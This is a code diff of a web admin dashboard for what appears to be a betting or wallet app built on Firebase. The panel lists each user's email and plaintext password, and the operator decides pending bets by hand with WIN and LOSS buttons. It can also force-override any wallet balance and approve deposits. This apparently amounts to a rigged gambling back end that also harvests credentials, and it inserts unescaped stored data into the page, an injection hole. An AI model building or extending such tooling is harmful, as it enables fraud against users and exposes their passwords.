@@ -8,58 +8,35 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { 
-            --neon-blue: #00f2ff; 
-            --neon-pink: #ff007a; 
-            --neon-purple: #7000ff; 
-            --neon-green: #38ef7d; 
-            --bg-dark: #020205;
+            --neon-blue: #00f2ff; --neon-pink: #ff007a; --neon-purple: #7000ff; --neon-green: #38ef7d; --bg-dark: #020205;
         }
-        
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
-        
         body { 
-            background: var(--bg-dark); 
-            color: white; 
-            padding: 20px; 
+            background: var(--bg-dark); color: white; padding: 20px; 
             background-image: radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), radial-gradient(at 100% 0%, hsla(225,39%,30%,1) 0, transparent 50%);
             min-height: 100vh;
         }
-
         h1 { text-align: center; font-weight: 900; letter-spacing: 5px; color: var(--neon-blue); margin-bottom: 30px; text-shadow: 0 0 15px rgba(0,242,255,0.4); }
-        
-        /* ANALYTICS HUD */
         .stats-hud { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
         .hud-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; text-align: center; backdrop-filter: blur(10px); }
         .hud-card h3 { font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
         .hud-card p { font-size: 28px; font-weight: 900; color: var(--neon-blue); }
-
-        /* COMMAND TABLE */
         .table-wrap { background: rgba(255,255,255,0.02); border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         table { width: 100%; border-collapse: collapse; min-width: 700px; }
         th { padding: 20px; text-align: left; font-size: 11px; text-transform: uppercase; color: var(--neon-blue); background: rgba(0,242,255,0.05); letter-spacing: 1px; }
         td { padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 14px; vertical-align: middle; }
-
-        /* NEURAL ID STYLING */
-        .neural-id { color: var(--neon-blue); font-weight: 600; cursor: pointer; text-decoration: none; transition: 0.2s; }
+        .neural-id { color: var(--neon-blue); font-weight: 600; cursor: pointer; transition: 0.2s; }
         .neural-id:hover { text-shadow: 0 0 10px var(--neon-blue); }
         .timestamp { font-size: 10px; color: rgba(255,255,255,0.3); margin-top: 4px; display: block; }
-
-        /* PROTOCOL TAGS */
         .tag { padding: 5px 10px; border-radius: 8px; font-size: 10px; font-weight: 900; text-transform: uppercase; display: inline-block; }
         .tag-login { background: rgba(112, 0, 255, 0.2); color: var(--neon-purple); border: 1px solid var(--neon-purple); }
         .tag-bet { background: rgba(255, 0, 122, 0.2); color: var(--neon-pink); border: 1px solid var(--neon-pink); }
         .tag-deposit { background: rgba(0, 242, 255, 0.2); color: var(--neon-blue); border: 1px solid var(--neon-blue); }
-
-        /* ACTION BUTTONS */
         .btn { padding: 10px 16px; border: none; border-radius: 12px; cursor: pointer; font-weight: 900; color: white; transition: 0.3s; margin-right: 5px; text-transform: uppercase; font-size: 11px; }
-        .btn-win { background: var(--neon-green); color: #000; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }
+        .btn-win, .btn-approve { background: var(--neon-green); color: #000; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }
         .btn-loss { background: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.2); }
         .btn-del { background: rgba(255,255,255,0.05); color: #888; border: 1px solid rgba(255,255,255,0.1); width: 35px; height: 35px; display: inline-flex; align-items: center; justify-content: center; border-radius: 10px; }
-        .btn-del:hover { background: #ef4444; color: white; border-color: #ef4444; }
-
-        /* SEARCH BAR */
-        #searchBox { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 15px 25px; border-radius: 20px; color: white; margin-bottom: 20px; font-size: 16px; outline: none; transition: 0.3s; }
-        #searchBox:focus { border-color: var(--neon-blue); box-shadow: 0 0 20px rgba(0,242,255,0.1); }
+        #searchBox { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 15px 25px; border-radius: 20px; color: white; margin-bottom: 20px; font-size: 16px; outline: none; }
     </style>
 </head>
 <body>
@@ -69,7 +46,7 @@
 <div class="stats-hud">
     <div class="hud-card"><h3>Live Signals</h3><p id="logCount">0</p></div>
     <div class="hud-card"><h3>Auth Events</h3><p id="authCount" style="color:var(--neon-purple)">0</p></div>
-    <div class="hud-card"><h3>Risk Nodes</h3><p id="betCount" style="color:var(--neon-pink)">0</p></div>
+    <div class="hud-card"><h3>Transactions</h3><p id="betCount" style="color:var(--neon-pink)">0</p></div>
 </div>
 
 <input type="text" id="searchBox" placeholder="SEARCH NEURAL ID (EMAIL)..." onkeyup="filterTable()">
@@ -95,18 +72,12 @@
     import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc, getDoc, setDoc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
     const firebaseConfig = { 
-        apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", 
-        authDomain: "home-help-service.firebaseapp.com", 
-        projectId: "home-help-service", 
-        storageBucket: "home-help-service.firebasestorage.app", 
-        messagingSenderId: "160722457510", 
-        appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" 
+        apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" 
     };
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // 1. REAL-TIME DATA HUB
     onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
         const body = document.getElementById("adminBody");
         let html = "";
@@ -121,6 +92,20 @@
             if(type.includes("LOG")) auths++; else bets++;
 
             let tagClass = type.includes("LOG") ? "tag-login" : (type.includes("DEPOSIT") ? "tag-deposit" : "tag-bet");
+            
+            // Generate Buttons based on Type
+            let actionButtons = "";
+            if (data.status === "PENDING") {
+                if (type === "DEPOSIT") {
+                    actionButtons = `<button class="btn btn-approve" onclick="approveDeposit('${id}','${data.email}','${data.password}')">APPROVE</button>`;
+                } else if (type.includes("BET")) {
+                    actionButtons = `
+                        <button class="btn btn-win" onclick="resolve('${id}','WIN 🏆','${data.email}','${data.password}')">WIN</button>
+                        <button class="btn btn-loss" onclick="resolve('${id}','LOST 💀','${data.email}','${data.password}')">LOSS</button>`;
+                }
+            } else {
+                actionButtons = `<span style="font-weight:900; font-size:11px; opacity:0.5;">${data.status || 'PROCESSED'}</span>`;
+            }
 
             html += `
                 <tr>
@@ -131,56 +116,53 @@
                     <td><code style="background:rgba(0,0,0,0.3); padding:5px 10px; border-radius:8px; font-weight:900;">${data.password || 'N/A'}</code></td>
                     <td><span class="tag ${tagClass}">${type}</span></td>
                     <td>
-                        ${data.status === "PENDING" ? `
-                            <button class="btn btn-win" onclick="resolve('${id}','WIN 🏆','${data.email}','${data.password}')">WIN</button>
-                            <button class="btn btn-loss" onclick="resolve('${id}','LOST 💀','${data.email}','${data.password}')">LOSS</button>
-                        ` : `<span style="font-weight:900; font-size:11px; opacity:0.5;">${data.status || 'PROCESSED'}</span>`}
+                        ${actionButtons}
                         <button class="btn btn-del" onclick="delLog('${id}')"><i class="fa fa-trash"></i></button>
                     </td>
                 </tr>`;
         });
-        
+
         body.innerHTML = html;
         document.getElementById("logCount").innerText = snap.size;
         document.getElementById("authCount").innerText = auths;
         document.getElementById("betCount").innerText = bets;
-    }, (err) => {
-        alert("CRITICAL ERROR: " + err.message);
     });
 
-    // 2. WALLET OVERRIDE (Click Email)
+    // APPROVE DEPOSIT (Adds amount to wallet)
+    window.approveDeposit = async (id, email, val) => {
+        const amt = parseInt(val.replace(/[^\d]/g, ''));
+        if(isNaN(amt)) return alert("Invalid Amount");
+
+        const snap = await getDoc(doc(db, "wallets", email));
+        const current = snap.exists() ? snap.data().balance : 0;
+        
+        await setDoc(doc(db, "wallets", email), { balance: current + amt });
+        await updateDoc(doc(db, "users", id), { status: "COMPLETED ✅" });
+        alert("DEPOSIT APPROVED: CREDITS ADDED");
+    };
+
     window.setBal = async (email) => {
         const val = prompt(`FORCE OVERRIDE BALANCE FOR: ${email}`);
         if(val !== null && val !== "") {
             await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
-            alert(`SUCCESS: Wallet for ${email} updated to ₹${val}`);
+            alert(`SUCCESS: Wallet updated to ₹${val}`);
         }
     };
 
-    // 3. RESOLVE NODE (Win/Loss)
     window.resolve = async (id, res, email, val) => {
         const amt = parseInt(val.replace(/[^\d]/g, ''));
         await updateDoc(doc(db, "users", id), { status: res });
-        
         if(res === "WIN 🏆") {
             const snap = await getDoc(doc(db, "wallets", email));
             const current = snap.exists() ? snap.data().balance : 0;
-            // PAYOUT 2X LOGIC
             await setDoc(doc(db, "wallets", email), { balance: current + (amt * 2) });
-            alert("TRANSACTION RESOLVED: PAYOUT DISPATCHED");
-        } else {
-            alert("TRANSACTION RESOLVED: NODE TERMINATED");
         }
     };
 
-    // 4. TERMINATE LOG
     window.delLog = async (id) => { 
-        if(confirm("PERMANENTLY TERMINATE THIS LOG FROM NEXUS?")) {
-            await deleteDoc(doc(db, "users", id));
-        }
+        if(confirm("TERMINATE THIS LOG?")) await deleteDoc(doc(db, "users", id));
     };
 
-    // 5. SEARCH FILTER
     window.filterTable = () => {
         let input = document.getElementById("searchBox").value.toUpperCase();
         let rows = document.getElementById("adminBody").getElementsByTagName("tr");
